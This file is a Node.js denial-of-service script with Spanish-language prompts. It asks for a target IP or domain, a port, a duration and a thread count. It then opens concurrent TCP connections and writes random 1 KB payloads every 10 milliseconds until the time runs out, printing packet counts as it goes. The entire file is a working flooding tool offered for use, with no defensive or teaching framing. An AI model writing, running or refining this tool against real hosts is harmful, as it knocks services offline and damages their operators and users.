#!/usr/bin/env node
'use strict';

const net = require('net');
const crypto = require('crypto');
const readline = require('readline');
const os = require('os');
const dns = require('dns').promises;

class DDoSAttack {
    constructor() {
        this.rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
        this.stats = {
            packets: 0,
            successful: 0,
            failed: 0,
            start: Date.now(),
            methods: new Set()
        };
        this.workers = [];
    }

    async input(message) {
        return new Promise(resolve => {
            this.rl.question(`\x1b[1;32m${message}\x1b[0m`, resolve);
        });
    }

    async inputNumber(message, min, max) {
        while (true) {
            const input = await this.input(message);
            const num = parseInt(input);
            if (!isNaN(num) && num >= min && num <= max) return num;
            console.log('\x1b[1;31mEntrada inválida. Intente nuevamente.\x1b[0m');
        }
    }

    async resolveDNS(target) {
        try {
            if (!net.isIP(target)) {
                const records = await dns.resolve4(target);
                console.log(`\x1b[1;36mDNS resuelto: ${records[0]}\x1b[0m`);
                return records[0];
            }
            return target;
        } catch {
            console.log('\x1b[1;33mFallo en resolución DNS, usando como IP\x1b[0m');
            return target;
        }
    }

    createTCPWorker(target, port) {
        return () => {
            const socket = net.connect(port, target, () => {
                const payload = crypto.randomBytes(1024);
                const interval = setInterval(() => {
                    try {
                        socket.write(payload);
                        this.stats.packets++;
                        this.stats.successful++;
                        this.stats.methods.add('TCP');
                    } catch {
                        this.stats.failed++;
                    }
                }, 10);

                socket.on('error', () => {
                    clearInterval(interval);
                    this.stats.failed++;
                });
            });
            return socket;
        };
    }

    async start() {
        console.log('\x1b[1;36m=== Configuración de Ataque ===\x1b[0m');

        const target = await this.input('Objetivo (IP/Dominio): ');
        this.target = await this.resolveDNS(target);
        this.port = await this.inputNumber('Puerto (1-65535): ', 1, 65535);
        this.duration = await this.inputNumber('Duración (segundos): ', 1, 3600);
        this.threads = await this.inputNumber('Número de hilos: ', 1, Math.max(1, os.cpus()?.length || 1) * 2);

        console.log('\n\x1b[1;36m=== Resumen ===\x1b[0m');
        console.log(`Objetivo: ${this.target}`);
        console.log(`Puerto: ${this.port}`);
        console.log(`Duración: ${this.duration}s`);
        console.log(`Hilos: ${this.threads}`);

        const confirm = await this.input('¿Iniciar ataque? (s/n): ');
        if (confirm.toLowerCase() !== 's') {
            console.log('\x1b[1;33mAtaque cancelado\x1b[0m');
            process.exit(0);
        }

        await this.runAttack();
    }

    async runAttack() {
        console.log('\n\x1b[1;31mIniciando ataque...\x1b[0m');

        for (let i = 0; i < this.threads; i++) {
            this.workers.push(this.createTCPWorker(this.target, this.port)());
        }

        const statsInterval = setInterval(() => {
            const elapsed = Math.floor((Date.now() - this.stats.start) / 1000);
            console.log('\n\x1b[1;35m=== Estadísticas ===\x1b[0m');
            console.log(`Tiempo: ${elapsed}s`);
            console.log(`Paquetes: ${this.stats.packets}`);
            console.log(`Exitosos: ${this.stats.successful}`);
            console.log(`Fallidos: ${this.stats.failed}`);
            console.log(`Métodos: ${Array.from(this.stats.methods).join(', ')}`);
        }, 5000);

        setTimeout(() => {
            clearInterval(statsInterval);
            this.stopAttack();
            console.log('\n\x1b[1;32mAtaque completado\x1b[0m');
            process.exit(0);
        }, this.duration * 1000);
    }

    stopAttack() {
        this.workers.forEach(worker => {
            if (worker.destroy) worker.destroy();
            if (worker.close) worker.close();
        });
    }
}

process.on('SIGINT', () => {
    console.log('\n\x1b[1;33mAtaque detenido manualmente\x1b[0m');
    process.exit(0);
});

new DDoSAttack().start().catch(err => {
    console.error('\x1b[1;31mError:', err.message, '\x1b[0m');
    process.exit(1);
});
